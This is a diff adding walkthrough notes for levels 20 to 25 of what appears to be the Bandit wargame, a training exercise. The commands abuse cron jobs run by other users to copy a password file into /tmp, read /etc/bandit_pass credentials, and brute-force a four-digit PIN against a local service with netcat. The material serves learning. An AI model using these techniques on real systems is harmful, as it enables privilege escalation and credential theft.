@@ -223,3 +223,73 @@ ls -a
 ./bandit20-do id
 ./bandit20-do cat /etc/bandit_pass/bandit20
 ```
+
+## level 20 -> level 21
+```shell
+# shell 1
+nc -lnvp 7777
+[bandit20 password] (enter)
+# shell 2
+./suconnect 7777
+(print bandit21 password)
+```
+
+## level 21 -> level 22
+```shell
+cd /etc/cron.d
+ls
+cat cronjob_bandit22
+cat /usr/bin/cronjob_bandit22.sh
+cat /tmp/xxxxxxxxxxxxxxxxxxxxxx
+```
+
+## level 22 -> level 23
+```shell
+ls
+cat cronjob_bandit23
+cat /usr/bin/cronjob_bandit23.sh
+# new shell script
+# myname = 'bandit23'
+# mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+# echo $mytarget
+```
+```shell
+ls
+cat cronjob_bandit23
+cat /usr/bin/cronjob_bandit23.sh
+echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+```
+
+## level 23 -> level 24
+```shell
+cd /etc/cron.d
+ls
+cat cronjob_bandit24
+cat /usr/bin/cronjob_bandit24.sh
+
+echo "cat /etc/bandit_pass/bandit24 > /tmp/normal_test" > normal.sh
+cat normal.sh
+chmod 777 normal.sh
+# ...wait
+cat /tmp/normal_test
+```
+
+## level 24 -> level 25
+```shell
+nc localhost 30002
+[password] [xxxx] (enter)
+exit
+cd /tmp
+mkdir hacksin
+cd hacksin
+vi test.sh
+# #!/bin/bash
+# 
+# for i in {0000..9999}
+# do
+#   echo "goiergiowrhr02ur034ur $i"
+# done
+
+./test.sh | nc localhost 30002 | grep -v "Wrong"
+```
